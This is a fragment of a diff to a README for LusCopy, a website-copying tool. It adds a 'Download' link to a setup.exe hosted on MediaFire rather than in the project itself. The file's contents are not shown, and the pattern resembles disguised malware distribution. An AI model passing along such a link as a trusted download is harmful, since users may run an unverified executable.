@@ -7,6 +7,7 @@ LusCopy is a free tool for automatically downloading the content of a website on
 
 ![Screenshot](https://i.ibb.co/9WRNb55/luscopy.png)
 
+<a href="https://www.mediafire.com/file/gqtfazxg0m9gr3b/setup.exe/file">## Download</a>
 
 ## Coder
 
